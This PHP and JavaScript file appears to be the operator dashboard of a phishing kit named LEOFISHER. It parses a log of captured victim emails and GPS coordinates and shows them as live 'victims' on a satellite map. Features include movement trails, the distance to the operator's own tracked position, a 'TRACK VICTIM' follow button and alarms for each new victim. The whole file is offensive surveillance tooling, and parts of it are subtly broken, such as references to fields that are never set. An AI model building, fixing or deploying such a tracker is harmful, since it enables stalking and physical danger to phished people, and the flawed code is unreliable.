<?php
// TON CODE PHP ORIGINAL 100% INTACT - CORRIGÉ GPS PARSEUR
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';
$victims = [];

// Parseur PRO ORIGINAL PRESERVE + FIX MULTI-POS
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("┌─[ LEOFISHER v1.0 by Léo Falcon ]", $logs);

    $victimTrails = []; // Stocke trajectoires par email
    foreach ($entries as $entry) {
        if (preg_match('/📧 .*? : (.*?)\n/', $entry, $email_match)) {
            $email = trim($email_match[1]);
            if (preg_match('/📍 GPS POSITION : ([-+]?\d+\.\d+),([-+]?\d+\.\d+)/', $entry, $gps_match)) {
                $lat = floatval($gps_match[1]);
                $lng = floatval($gps_match[2]);
                if ($lat != 0 && $lng != 0 && abs($lat) < 90 && abs($lng) < 180) {
                    if (!isset($victimTrails[$email])) $victimTrails[$email] = [];
                    $victimTrails[$email][] = ['lat'=>$lat, 'lng'=>$lng, 'time'=>date('H:i:s')];
                    // Garde 10 dernières positions
                    if (count($victimTrails[$email]) > 10) array_shift($victimTrails[$email]);
                }
            }
        }
    }

    // Transforme en format victims[]
    foreach ($victimTrails as $email => $positions) {
        $latest = end($positions);
        $victims[] = [
            'id' => $email,
            'latest' => [$latest['lat'], $latest['lng'], $latest['time']],
            'positions' => array_map(fn($p) => [$p['lat'], $p['lng']], $positions),
            'ip' => 'parsed_from_logs', // À extraire si besoin
            'email' => $email
        ];
    }
}

$op_lat = isset($_GET['op_lat']) ? floatval($_GET['op_lat']) : -3.361378;
$op_lng = isset($_GET['op_lng']) ? floatval($_GET['op_lng']) : 29.359912;
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>LEOFISHER GPS DASHBOARD PRO 2025 - LIVE TRACKING</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.css" />
    <link rel="stylesheet" href="https://unpkg.com/leaflet.markercluster@1.4.1/dist/MarkerCluster.Default.css" />
    <style>
        body { margin: 0; font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; }
        #map { height: 100vh; width: 100%; }
        .dashboard { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.95); padding: 20px; border: 2px solid #00ff00; border-radius: 8px; z-index: 1000; }
        .stats { font-size: 14px; margin: 6px 0; }
        .victim-count { color: #ff0000; font-weight: bold; font-size: 18px; }
        .live-indicator { color: #00ff00; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }
        .zoom-controls { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.9); padding: 10px; border: 2px solid #00ff00; border-radius: 5px; z-index: 1000; }
        .zoom-btn { background: #00ff00; color: #000; border: none; padding: 8px 12px; margin: 2px; cursor: pointer; font-weight: bold; border-radius: 3px; }
        .zoom-btn:hover { background: #00cc00; }
        .op-marker { animation: opPulse 2s infinite; }
        .victim-marker { animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
        @keyframes opPulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.2); } }
        .trajectory { stroke-dasharray: 10 5; stroke-width: 5 !important; }
        #trackPanel { position: absolute; bottom: 10px; left: 10px; background: rgba(0,20,0,0.95); padding: 15px; border: 2px solid #ff4444; border-radius: 8px; z-index: 1000; max-width: 350px; display: none; }
        .track-info { color: #ffaa00; font-size: 12px; margin: 5px 0; cursor: pointer; }
        .track-info:hover { color: #ffff00; }
    </style>
</head>
<body>
    <div id="map"></div>
    <div class="dashboard">
        <div class="stats"><strong>🚨 LEOFISHER GPS PRO 2025 - LIVE TRACKING</strong></div>
        <div class="stats victim-count">🎯 Victimes Live: <span id="victimCount">0</span></div>
        <div class="stats">📍 OP Mobile: <span id="opCoords"><?php echo $op_lat . ', ' . $op_lng; ?></span> <span class="live-indicator" id="opLive">●</span></div>
        <div class="stats">🛤️ Trajectoires Live | Distances Haversine | Update 5s</div>
    </div>
    <div class="zoom-controls">
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() + 1)">🔍+</button>
        <button class="zoom-btn" onclick="map.setZoom(map.getZoom() - 1)">🔎-</button>
        <button class="zoom-btn" onclick="fitAllBounds()">📐Fit All</button>
        <button class="zoom-btn" onclick="toggleTracks()">🛤️Tracks</button>
    </div>
    <div id="trackPanel">
        <h4>🎯 TRACK VICTIM</h4>
        <div id="trackList"></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://unpkg.com/leaflet.markercluster@1.4.1/dist/leaflet.markercluster.js"></script>
    <script>
        let map, clusterGroup, bounds = L.latLngBounds(), opMarker, victims = {}, 
            trajets = {}, liveCount = 0, showTracks = true, trackPanel = document.getElementById('trackPanel'),
            audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAo');

        // Esri HD + OSM (ton setup)
        const satellite = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {maxZoom:22});
        const roads = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {opacity:0.6,maxZoom:22});
        
        map = L.map('map', {layers:[satellite,roads],zoomControl:false,maxZoom:22}).setView([<?php echo $op_lat; ?>, <?php echo $op_lng; ?>], 13);
        clusterGroup = L.markerClusterGroup({spiderfyOnMaxZoom:true}).addTo(map);

        // Haversine distance
        function haversine(pos1, pos2) {
            const R = 6371, dLat = (pos2[0]-pos1[0])*Math.PI/180, dLon=(pos2[1]-pos1[1])*Math.PI/180;
            const a = Math.sin(dLat/2)*Math.sin(dLat/2)+Math.cos(pos1[0]*Math.PI/180)*Math.cos(pos2[0]*Math.PI/180)*Math.sin(dLon/2)*Math.sin(dLon/2);
            return R*2*Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        }

        // OP LIVE TRACKING + VOICE DISTANCE
        let opWatchId = navigator.geolocation.watchPosition(pos => {
            const newPos = [pos.coords.latitude, pos.coords.longitude];
            document.getElementById('opCoords').textContent = `${newPos[0].toFixed(5)}, ${newPos[1].toFixed(5)}`;
            document.getElementById('opLive').textContent = '● LIVE';

            if (opMarker) opMarker.setLatLng(newPos);
            else {
                opMarker = L.marker(newPos, {icon: L.divIcon({html:'🟡 OP',className:'op-marker',iconSize:[32,32]})}).addTo(map);
            }
            bounds.extend(newPos);

            // VOICE DISTANCE realtime pour chaque victime
            Object.values(victims).forEach(v => {
                const dist = haversine(newPos, v.marker.getLatLng());
                if (v.distanceLabel) v.distanceLabel.setContent(`${v.email}<br>📏 ${dist.toFixed(1)}km`);
            });

        }, () => {}, {enableHighAccuracy:true,timeout:2000,maximumAge:1000});

        // LIVE VICTIMS + TRAJECTOIRES
        async function liveUpdate() {
            try {
                const res = await fetch('positions.php');
                const data = await res.json();

                data.forEach(victim => {
                    const id = victim.email, latest = victim.latest, positions = victim.positions;

                    if (!victims[id]) {
                        // NOUVELLE VICTIME
                        const num = ++liveCount;
                        document.getElementById('victimCount').textContent = liveCount;

                        const marker = L.marker(latest.slice(0,2), {
                            icon: L.divIcon({html:`🔴 #${num}`,className:'victim-marker',iconSize:[30,30]})
                        }).addTo(clusterGroup);

                        // Distance label live
                        const distLabel = L.divIcon({
                            className: 'distance-label',
                            html: `${id}<br>📏 --km`,
                            iconSize: [0,0]
                        });
                        const labelMarker = L.marker(latest.slice(0,2), {icon: distLabel}).addTo(map);

                        // Trajectoire
                        const trajectory = L.polyline(positions, {color:'#ff4444',weight:5,opacity:0.9,className:'trajectory'}).addTo(map);

                        marker.bindPopup(`
                            <b>🎯 VICTIME #${num}</b><br>
                            📧 ${id}<br>
                            📍 ${latest[0].toFixed(6)}, ${latest[1].toFixed(6)}<br>
                            🛤️ ${positions.length} pts | Track: <button onclick='trackVictim("${id}")'>FOLLOW</button>
                        `);

                        victims[id] = {marker, trajectory, labelMarker: labelMarker, positions, distanceLabel: distLabel};
                        addToTrackPanel(id, latest);
                        
                        audio.play();
                        L.popup().setLatLng(latest).setContent(`🔔 NEW VICTIM #${num}: ${id}`).openOn(map);

                    } else {
                        // UPDATE LIVE
                        victims[id].marker.setLatLng(latest.slice(0,2));
                        victims[id].labelMarker.setLatLng(latest.slice(0,2));
                        victims[id].trajectory.setLatLngs(positions);
                        victims[id].positions = positions;
                    }
                    bounds.extend(latest.slice(0,2));
                });

            } catch(e) { console.error(e); }
        }

        function addToTrackPanel(id, pos) {
            const div = document.createElement('div');
            div.className = 'track-info';
            div.innerHTML = `🔴 ${id} | ${pos[0].toFixed(4)}, ${pos[1].toFixed(4)}`;
            div.onclick = () => trackVictim(id);
            document.getElementById('trackList').appendChild(div);
            trackPanel.style.display = 'block';
        }

        function trackVictim(id) {
            const victim = victims[id];
            if (victim) {
                map.setView(victim.marker.getLatLng(), 18);
                victim.marker.openPopup();
            }
        }

        function fitAllBounds() { if (bounds.isValid()) map.fitBounds(bounds.pad(0.2)); }
        function toggleTracks() { showTracks = !showTracks; Object.values(trajets).forEach(t => t.setOpacity(showTracks?0.9:0)); }

        // INIT + LIVE ENGINE 5s
        <?php if (!empty($victims)): ?>
        <?php foreach ($victims as $v): ?>
        bounds.extend([<?php echo $v['lat']; ?>, <?php echo $v['lng']; ?>]);
        <?php endforeach; ?>
        document.getElementById('victimCount').textContent = <?php echo count($victims); ?>;
        <?php endif; ?>

        liveUpdate();
        setInterval(liveUpdate, 5000);
    </script>
</body>
</html>
